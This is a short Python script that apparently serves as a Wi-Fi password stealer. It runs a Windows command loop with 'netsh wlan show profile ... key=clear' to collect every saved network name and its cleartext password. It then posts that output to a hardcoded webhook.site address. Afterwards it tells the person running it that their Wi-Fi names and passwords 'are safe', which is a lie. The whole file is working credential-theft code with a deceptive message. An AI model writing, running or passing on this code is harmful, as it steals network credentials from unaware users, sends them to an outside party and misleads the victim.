import subprocess
import urllib.request
import urllib.error
# Function to run a command and return its output as a string
def run_command(command):
try:
output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
return output
except subprocess.CalledProcessError as e:
return str(e.output)
# Function to send CMD output to webhook
def send_to_webhook(output, webhook_url):
# Define headers and prepare data
headers = {'Content-Type': 'text/plain'}
# Send the CMD output to the webhook using an HTTP request
req = urllib.request.Request(webhook_url, data=output.encode('utf-8'), headers=headers)
try:
with urllib.request.urlopen(req) as response:
print("Your Wi-Fi Profile Names and Passwords are safe.")
except urllib.error.URLError as e:
print("Error sending the request:", e)
if __name__ == "__main__":
# Define the webhook URL (replace with your own)
webhook_url = "https://webhook.site/ae6c8f3b-9d2e-48e7-bdab-9a1e4a38db94"
# Execute the provided CMD command and send the output to the webhook
cmd_command = 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @echo %j | findstr -i -v echo | netsh wlan show profile %j key=clear'
cmd_output = run_command(cmd_command)
send_to_webhook(cmd_output, webhook_url)
